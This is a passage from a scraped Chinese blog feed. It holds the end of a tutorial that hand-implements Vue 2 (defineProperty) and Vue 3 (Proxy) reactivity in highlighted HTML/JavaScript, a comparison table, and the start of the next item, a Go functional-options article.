      <span class="hljs-title function_">compileElement</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">const</span> attrs = node.<span class="hljs-property">attributes</span>;
        <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(attrs).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">attr</span> =&gt;</span> {
          <span class="hljs-keyword">const</span> attrName = attr.<span class="hljs-property">name</span>;
          <span class="hljs-comment">// 判断是否是指令</span>
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isDirective</span>(attrName)) {
            <span class="hljs-keyword">const</span> expr = attr.<span class="hljs-property">value</span>; <span class="hljs-comment">// 指令对应的数据属性（如 'message'）</span>
            <span class="hljs-keyword">const</span> [, directive] = attrName.<span class="hljs-title function_">split</span>(<span class="hljs-string">'-'</span>); <span class="hljs-comment">// 提取指令名（如 'model'）</span>
            <span class="hljs-comment">// 执行指令对应的更新方法</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">compileUtil</span>[directive](node, <span class="hljs-variable language_">this</span>.<span class="hljs-property">vm</span>, expr);
          }
        });
      }

      <span class="hljs-comment">// 解析文本节点（{{}} 插值）</span>
      <span class="hljs-title function_">compileText</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">const</span> textContent = node.<span class="hljs-property">textContent</span>;
        <span class="hljs-comment">// 正则匹配 {{xxx}} 格式</span>
        <span class="hljs-keyword">const</span> reg = <span class="hljs-regexp">/\{\{(.+?)\}\}/g</span>;
        <span class="hljs-keyword">if</span> (reg.<span class="hljs-title function_">test</span>(textContent)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">compileUtil</span>.<span class="hljs-title function_">text</span>(node, <span class="hljs-variable language_">this</span>.<span class="hljs-property">vm</span>, textContent);
        }
      }

      <span class="hljs-comment">// 指令处理工具集</span>
      compileUtil = {
        <span class="hljs-comment">// 获取数据属性的值</span>
        <span class="hljs-title function_">getVal</span>(<span class="hljs-params">vm, expr</span>) {
          <span class="hljs-keyword">return</span> expr.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">data, currentKey</span>) =&gt;</span> {
            <span class="hljs-keyword">return</span> data[currentKey];
          }, vm.<span class="hljs-property">$data</span>);
        },

        <span class="hljs-comment">// 设置数据属性的值（用于 v-model）</span>
        <span class="hljs-title function_">setVal</span>(<span class="hljs-params">vm, expr, value</span>) {
          <span class="hljs-keyword">return</span> expr.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">data, currentKey, index, arr</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (index === arr.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
              <span class="hljs-keyword">return</span> data[currentKey] = value;
            }
            <span class="hljs-keyword">return</span> data[currentKey];
          }, vm.<span class="hljs-property">$data</span>);
        },

        <span class="hljs-comment">// 处理 v-model 指令</span>
        <span class="hljs-title function_">model</span>(<span class="hljs-params">node, vm, expr</span>) {
          <span class="hljs-keyword">const</span> updateFn = <span class="hljs-variable language_">this</span>.<span class="hljs-property">updater</span>.<span class="hljs-property">modelUpdater</span>;
          <span class="hljs-comment">// 1. 初始化：设置输入框默认值</span>
          <span class="hljs-title function_">updateFn</span>(node, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(vm, expr));
          <span class="hljs-comment">// 2. 创建 Watcher：数据变化时更新输入框</span>
          <span class="hljs-keyword">new</span> <span class="hljs-title class_">Watcher</span>(vm, expr, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
            <span class="hljs-title function_">updateFn</span>(node, newValue);
          });
          <span class="hljs-comment">// 3. 监听输入框事件：输入内容同步到 data</span>
          node.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> newValue = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setVal</span>(vm, expr, newValue);
          });
        },

        <span class="hljs-comment">// 处理 {{}} 插值文本</span>
        <span class="hljs-title function_">text</span>(<span class="hljs-params">node, vm, expr</span>) {
          <span class="hljs-keyword">const</span> updateFn = <span class="hljs-variable language_">this</span>.<span class="hljs-property">updater</span>.<span class="hljs-property">textUpdater</span>;
          <span class="hljs-comment">// 替换 {{}} 为真实数据</span>
          <span class="hljs-keyword">const</span> content = expr.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\{\{(.+?)\}\}/g</span>, <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> prop = args[<span class="hljs-number">1</span>].<span class="hljs-title function_">trim</span>();
            <span class="hljs-comment">// 创建 Watcher：数据变化时更新文本</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Watcher</span>(vm, prop, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
              <span class="hljs-title function_">updateFn</span>(node, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getContentValue</span>(vm, expr));
            });
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(vm, prop);
          });
          <span class="hljs-comment">// 初始化文本内容</span>
          <span class="hljs-title function_">updateFn</span>(node, content);
        },

        <span class="hljs-comment">// 获取插值文本的完整内容（处理多个 {{}} 情况）</span>
        <span class="hljs-title function_">getContentValue</span>(<span class="hljs-params">vm, expr</span>) {
          <span class="hljs-keyword">return</span> expr.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\{\{(.+?)\}\}/g</span>, <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(vm, args[<span class="hljs-number">1</span>].<span class="hljs-title function_">trim</span>());
          });
        },

        <span class="hljs-comment">// DOM 更新方法集</span>
        <span class="hljs-attr">updater</span>: {
          <span class="hljs-comment">// 更新 v-model 指令的 DOM（输入框值）</span>
          <span class="hljs-title function_">modelUpdater</span>(<span class="hljs-params">node, value</span>) {
            node.<span class="hljs-property">value</span> = value;
          },
          <span class="hljs-comment">// 更新文本节点内容</span>
          <span class="hljs-title function_">textUpdater</span>(<span class="hljs-params">node, value</span>) {
            node.<span class="hljs-property">textContent</span> = value;
          }
        }
      };
    }

    <span class="hljs-comment">//  5. Vue 核心类：整合所有模块 </span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vue</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$el</span> = options.<span class="hljs-property">el</span>; <span class="hljs-comment">// 挂载元素</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$data</span> = options.<span class="hljs-property">data</span>; <span class="hljs-comment">// 响应式数据</span>

        <span class="hljs-comment">// 1. 如果有挂载元素，初始化响应式</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">$el</span>) {
          <span class="hljs-comment">// 劫持 data 所有属性</span>
          <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$data</span>);
          <span class="hljs-comment">// 代理 data 属性到 Vue 实例（可通过 vm.message 访问 vm.$data.message）</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">proxyData</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$data</span>);
          <span class="hljs-comment">// 解析模板</span>
          <span class="hljs-keyword">new</span> <span class="hljs-title class_">Compile</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$el</span>, <span class="hljs-variable language_">this</span>);
        }
      }

      <span class="hljs-comment">// 代理 data 属性到 Vue 实例</span>
      <span class="hljs-title function_">proxyData</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(data).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
          <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-variable language_">this</span>, key, {
            <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
              <span class="hljs-keyword">return</span> data[key];
            },
            <span class="hljs-title function_">set</span>(<span class="hljs-params">newValue</span>) {
              data[key] = newValue;
            }
          });
        });
      }
    }

    <span class="hljs-comment">//  测试例子 </span>
    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>: {
        <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello Vue2 响应式！'</span>,
        <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>
      }
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-5">二、 Vue 3：基于 Proxy 的升级进化</h2>
<h3 data-id="heading-6">1. 核心改进</h3>
<p>Vue 3 彻底放弃了 <code>Object.defineProperty</code>，转而使用 ES6 的 <code>Proxy</code>。它不仅解决了 Vue 2 无法监听对象新增属性和数组索引的问题，还显著提升了初始化性能。</p>
<h3 data-id="heading-7">2. 响应式流程</h3>
<ol>
<li>
<p><strong>Proxy 代理</strong>：拦截对象的 <code>get</code> 和 <code>set</code>。</p>
</li>
<li>
<p><strong>依赖追踪 (Track)</strong> ：在 <code>get</code> 时，将当前正在执行的 <code>Effect</code>（副作用函数）记录在全局映射表 <code>targetMap</code> 中。</p>
</li>
<li>
<p><strong>触发更新 (Trigger)</strong> ：在 <code>set</code> 时，从 <code>targetMap</code> 中找到该属性对应的所有 <code>Effect</code> 并重新执行。</p>
</li>
</ol>
<h3 data-id="heading-8">3. 源码仿真实现</h3>
<p>在 Vue3中，我们通过 <code>reactive</code> 声明响应式数据。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue3 双向数据绑定简易实现<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 测试模板 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{{ message }}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"message"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>年龄：{{ user.age }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>  <span class="hljs-attr">onclick</span>=<span class="hljs-string">"state.user.age++"</span>&gt;</span>年龄+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"number"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"user.age"</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">//  1. 依赖管理核心：存储「数据-副作用」映射 </span>
    <span class="hljs-keyword">const</span> targetMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>(); <span class="hljs-comment">// 全局依赖映射：target → key → effects</span>
    <span class="hljs-keyword">let</span> activeEffect = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 当前正在执行的副作用函数</span>

    <span class="hljs-comment">// 收集依赖（追踪）</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">if</span> (!activeEffect) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 无副作用函数则不收集</span>
      <span class="hljs-comment">// 1. 获取 target 对应的依赖映射</span>
      <span class="hljs-keyword">let</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);
      <span class="hljs-keyword">if</span> (!depsMap) {
        depsMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
        targetMap.<span class="hljs-title function_">set</span>(target, depsMap);
      }
      <span class="hljs-comment">// 2. 获取 key 对应的副作用集合</span>
      <span class="hljs-keyword">let</span> deps = depsMap.<span class="hljs-title function_">get</span>(key);
      <span class="hljs-keyword">if</span> (!deps) {
        deps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(); <span class="hljs-comment">// 用 Set 避免重复副作用</span>
        depsMap.<span class="hljs-title function_">set</span>(key, deps);
      }
      <span class="hljs-comment">// 3. 添加当前副作用到集合</span>
      deps.<span class="hljs-title function_">add</span>(activeEffect);
    }

    <span class="hljs-comment">// 触发依赖更新</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-comment">// 1. 获取 target 对应的依赖映射</span>
      <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);
      <span class="hljs-keyword">if</span> (!depsMap) <span class="hljs-keyword">return</span>;
      <span class="hljs-comment">// 2. 获取 key 对应的副作用集合</span>
      <span class="hljs-keyword">const</span> deps = depsMap.<span class="hljs-title function_">get</span>(key);
      <span class="hljs-keyword">if</span> (!deps) <span class="hljs-keyword">return</span>;
      <span class="hljs-comment">// 3. 执行所有副作用函数</span>
      deps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> <span class="hljs-title function_">effect</span>());
    }

    <span class="hljs-comment">//  2. 创建响应式对象：reactive（基于 Proxy + Reflect） </span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">target</span>) {
      <span class="hljs-comment">// 非对象直接返回</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> target !== <span class="hljs-string">'object'</span> || target === <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> target;
      }

      <span class="hljs-comment">// 创建 Proxy 代理</span>
      <span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
        <span class="hljs-comment">// 拦截属性读取</span>
        <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
          <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
          <span class="hljs-title function_">track</span>(target, key); <span class="hljs-comment">// 收集依赖</span>
          <span class="hljs-comment">// 递归处理嵌套对象（懒代理，读取时才创建响应式）</span>
          <span class="hljs-keyword">return</span> <span class="hljs-title function_">reactive</span>(result);
        },
        <span class="hljs-comment">// 拦截属性赋值</span>
        <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
          <span class="hljs-keyword">const</span> oldValue = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
          <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
          <span class="hljs-comment">// 值变化才触发更新</span>
          <span class="hljs-keyword">if</span> (oldValue !== value) {
            <span class="hljs-title function_">trigger</span>(target, key); <span class="hljs-comment">// 触发依赖更新</span>
          }
          <span class="hljs-keyword">return</span> result;
        },
        <span class="hljs-comment">// 拦截属性删除（可选，补充完整度）</span>
        <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, key</span>) {
          <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key);
          <span class="hljs-title function_">trigger</span>(target, key);
          <span class="hljs-keyword">return</span> result;
        }
      });

      <span class="hljs-keyword">return</span> proxy;
    }

    <span class="hljs-comment">//  3. 副作用函数：effect（依赖收集的入口） </span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">effect</span>(<span class="hljs-params">fn</span>) {
      <span class="hljs-comment">// 包装副作用函数</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">effectFn</span> = (<span class="hljs-params"/>) =&gt; {
        activeEffect = effectFn; <span class="hljs-comment">// 标记当前副作用</span>
        <span class="hljs-title function_">fn</span>(); <span class="hljs-comment">// 执行函数，触发 get 拦截，收集依赖</span>
        activeEffect = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 重置</span>
      };
      <span class="hljs-title function_">effectFn</span>(); <span class="hljs-comment">// 立即执行一次，完成初始依赖收集</span>
      <span class="hljs-keyword">return</span> effectFn;
    }

    <span class="hljs-comment">//  4. 模板解析器：Compile（解析 {{}} 和 v-model） </span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Compile</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">el, data</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(el); <span class="hljs-comment">// 挂载元素</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data; <span class="hljs-comment">// 响应式数据</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">fragment</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createFragment</span>(); <span class="hljs-comment">// 创建文档碎片</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compile</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">fragment</span>); <span class="hljs-comment">// 解析模板</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">fragment</span>); <span class="hljs-comment">// 挂载到 DOM</span>
      }

      <span class="hljs-comment">// 创建文档碎片（减少 DOM 操作）</span>
      <span class="hljs-title function_">createFragment</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
        <span class="hljs-keyword">let</span> child;
        <span class="hljs-keyword">while</span> (child = <span class="hljs-variable language_">this</span>.<span class="hljs-property">el</span>.<span class="hljs-property">firstChild</span>) {
          fragment.<span class="hljs-title function_">appendChild</span>(child);
        }
        <span class="hljs-keyword">return</span> fragment;
      }

      <span class="hljs-comment">// 核心解析方法</span>
      <span class="hljs-title function_">compile</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-number">1</span>) { <span class="hljs-comment">// 元素节点（解析 v-model）</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compileElement</span>(node);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-regexp">/\{\{(.+?)\}\}/</span>.<span class="hljs-title function_">test</span>(node.<span class="hljs-property">textContent</span>)) { <span class="hljs-comment">// 文本节点（解析 {{}}）</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compileText</span>(node);
        }

        <span class="hljs-comment">// 递归解析子节点</span>
        node.<span class="hljs-property">childNodes</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">compile</span>(child));
      }

      <span class="hljs-comment">// 解析元素节点（v-model 指令）</span>
      <span class="hljs-title function_">compileElement</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">const</span> attrs = node.<span class="hljs-property">attributes</span>;
        <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(attrs).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">attr</span> =&gt;</span> {
          <span class="hljs-keyword">const</span> { name, value } = attr;
          <span class="hljs-keyword">if</span> (name === <span class="hljs-string">'v-model'</span>) { <span class="hljs-comment">// 处理 v-model</span>
            <span class="hljs-comment">// 1. 初始化：用响应式数据设置 DOM 值</span>
            node.<span class="hljs-property">value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(value);
            <span class="hljs-comment">// 2. 监听输入事件，同步到响应式数据</span>
            node.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
              <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setVal</span>(value, e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>);
            });
            <span class="hljs-comment">// 3. 监听数据变化，更新 DOM</span>
            <span class="hljs-title function_">effect</span>(<span class="hljs-function">() =&gt;</span> {
              node.<span class="hljs-property">value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(value);
            });
            <span class="hljs-comment">// 移除指令属性（可选，美化 DOM）</span>
            node.<span class="hljs-title function_">removeAttribute</span>(name);
          }
        });
      }

      <span class="hljs-comment">// 解析文本节点（{{}} 插值）</span>
      <span class="hljs-title function_">compileText</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">const</span> reg = <span class="hljs-regexp">/\{\{(.+?)\}\}/g</span>;
        <span class="hljs-keyword">const</span> text = node.<span class="hljs-property">textContent</span>;
        <span class="hljs-comment">// 替换 {{}} 为真实数据，并创建副作用</span>
        node.<span class="hljs-property">textContent</span> = text.<span class="hljs-title function_">replace</span>(reg, <span class="hljs-function">(<span class="hljs-params">_, expr</span>) =&gt;</span> {
          <span class="hljs-keyword">const</span> prop = expr.<span class="hljs-title function_">trim</span>();
          <span class="hljs-comment">// 监听数据变化，更新文本</span>
          <span class="hljs-title function_">effect</span>(<span class="hljs-function">() =&gt;</span> {
            node.<span class="hljs-property">textContent</span> = text.<span class="hljs-title function_">replace</span>(reg, <span class="hljs-function">(<span class="hljs-params">_, innerExpr</span>) =&gt;</span> {
              <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(innerExpr.<span class="hljs-title function_">trim</span>());
            });
          });
          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getVal</span>(prop);
        });
      }

      <span class="hljs-comment">// 获取响应式数据的值（处理嵌套，如 user.age）</span>
      <span class="hljs-title function_">getVal</span>(<span class="hljs-params">expr</span>) {
        <span class="hljs-keyword">return</span> expr.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">data, key</span>) =&gt;</span> {
          <span class="hljs-keyword">return</span> data[key];
        }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>);
      }

      <span class="hljs-comment">// 设置响应式数据的值（处理嵌套，如 user.age）</span>
      <span class="hljs-title function_">setVal</span>(<span class="hljs-params">expr, value</span>) {
        <span class="hljs-keyword">return</span> expr.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">data, key, index, arr</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (index === arr.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
            <span class="hljs-comment">// 处理数字类型（如 age）</span>
            <span class="hljs-keyword">return</span> data[key] = <span class="hljs-built_in">isNaN</span>(<span class="hljs-title class_">Number</span>(value)) ? value : <span class="hljs-title class_">Number</span>(value);
          }
          <span class="hljs-keyword">return</span> data[key];
        }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>);
      }
    }

    <span class="hljs-comment">//  4. 测试代码 </span>
    <span class="hljs-comment">// 1. 创建响应式数据</span>
    <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
      <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello Vue3 双向绑定！'</span>,
      <span class="hljs-attr">user</span>: {
        <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>
      }
    });

    <span class="hljs-comment">// 2. 解析模板，完成双向绑定</span>
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Compile</span>(<span class="hljs-string">'#app'</span>, state);

    <span class="hljs-comment">// 暴露到全局，方便控制台测试</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">state</span> = state;
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>

</code></pre>
<h2 data-id="heading-9">三、 总结：Vue 2 vs Vue 3 响应式对比</h2>






























<table><thead><tr><th><strong>特性</strong></th><th><strong>Vue 2 (defineProperty)</strong></th><th><strong>Vue 3 (Proxy)</strong></th></tr></thead><tbody><tr><td><strong>性能</strong></td><td>必须全量遍历属性，开销大</td><td>懒代理（读取时才处理），更高效</td></tr><tr><td><strong>动态性</strong></td><td>无法检测属性新增、删除</td><td>完美支持属性新增、删除及数组索引</td></tr><tr><td><strong>实现复杂度</strong></td><td>需要手动重写数组方法</td><td>原生支持所有对象操作</td></tr><tr><td><strong>兼容性</strong></td><td>支持 IE9+</td><td>不支持 IE (依赖 ES6)</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go 的三种 Option 设计：从轻量 Functional Options 到 gRPC/OTel 进阶玩法]]></title>    <link>https://juejin.cn/post/7602225961095807010</link>    <guid>https://juejin.cn/post/7602225961095807010</guid>    <pubDate>2026-02-03T10:01:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602225961095807010" data-draft-id="7602216700747808768" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go 的三种 Option 设计：从轻量 Functional Options 到 gRPC/OTel 进阶玩法"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2026-02-03T10:01:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="下次一定57"/> <meta itemprop="url" content="https://juejin.cn/user/3722294009017404"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go 的三种 Option 设计：从轻量 Functional Options 到 gRPC/OTel 进阶玩法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3722294009017404/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    下次一定57
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:01:21.000Z" title="Tue Feb 03 2026 10:01:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
